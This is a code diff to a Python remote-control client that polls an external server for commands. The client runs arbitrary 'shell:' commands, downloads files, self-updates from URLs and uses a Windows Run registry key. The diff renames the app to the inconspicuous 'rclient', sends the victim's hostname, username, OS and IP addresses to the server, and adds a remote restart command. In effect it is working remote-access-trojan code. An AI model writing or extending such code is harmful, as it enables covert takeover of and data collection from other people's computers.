@@ -1,10 +1,13 @@
 import logging
 import os
+import platform
+import socket
 import shutil
 import subprocess
 import sys
 import time
 import uuid
+import getpass
 from pathlib import Path
 from urllib.parse import urlparse
 
@@ -15,8 +18,8 @@ SERVER_URL = "https://client-status-server.onrender.com"
 POLL_INTERVAL_SECONDS = 5
 REQUEST_TIMEOUT_SECONDS = 30
 COMMAND_TIMEOUT_SECONDS = 120
-APP_NAME = "RemoteControlClient"
-TASK_NAME = "RemoteControlClient"
+APP_NAME = "rclient"
+TASK_NAME = "rclient"
 RUN_REGISTRY_KEY = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 APP_VERSION = "1.0.0"
 GITHUB_OWNER = "hezztecan-spec"
@@ -76,9 +79,51 @@ def send_get(endpoint, params):
     return response.json()
 
 
+def get_local_ip_addresses():
+    addresses = []
+
+    try:
+        host_info = socket.gethostbyname_ex(socket.gethostname())
+        for address in host_info[2]:
+            if address and address not in addresses:
+                addresses.append(address)
+    except OSError:
+        pass
+
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+            sock.connect(("8.8.8.8", 80))
+            address = sock.getsockname()[0]
+            if address and address not in addresses:
+                addresses.append(address)
+    except OSError:
+        pass
+
+    return addresses
+
+
+def get_system_info():
+    return {
+        "hostname": socket.gethostname(),
+        "username": getpass.getuser(),
+        "os": platform.platform(),
+        "python_version": platform.python_version(),
+        "client_version": APP_VERSION,
+        "local_ips": ", ".join(get_local_ip_addresses()) or "unknown",
+        "frozen": "true" if IS_FROZEN else "false",
+    }
+
+
 def register_client(client_id):
     logging.info("Registering client %s", client_id)
-    send_post("/register", {"client_id": client_id, "token": TOKEN})
+    send_post(
+        "/register",
+        {
+            "client_id": client_id,
+            "token": TOKEN,
+            "system_info": get_system_info(),
+        },
+    )
 
 
 def get_command(client_id):
@@ -159,6 +204,17 @@ def execute_update(command_text):
     return apply_update_from_url(update_url, source="manual")
 
 
+def restart_current_client():
+    script_path = Path(sys.executable).resolve() if IS_FROZEN else Path(__file__).resolve()
+
+    if IS_FROZEN and is_windows():
+        start_detached_windows_process([str(script_path)])
+        raise RestartRequested("client_restarted source=manual restarting=true")
+
+    restart_python_client(script_path)
+    raise RestartRequested("client_restarted source=manual restarting=true")
+
+
 def execute_command(command_text):
     if not isinstance(command_text, str):
         raise ValueError("command must be a string")
@@ -167,6 +223,8 @@ def execute_command(command_text):
     if not normalized:
         raise ValueError("command is empty")
 
+    if normalized == "restart":
+        return restart_current_client()
     if normalized.startswith("shell:"):
         return execute_shell(normalized)
     if normalized.startswith("download:"):
@@ -175,7 +233,7 @@ def execute_command(command_text):
         return execute_update(normalized)
 
     raise ValueError(
-        "unsupported command format. Use shell:<cmd>, download:<url> [filename], or update:<url>"
+        "unsupported command format. Use restart, shell:<cmd>, download:<url> [filename], or update:<url>"
     )
 
 
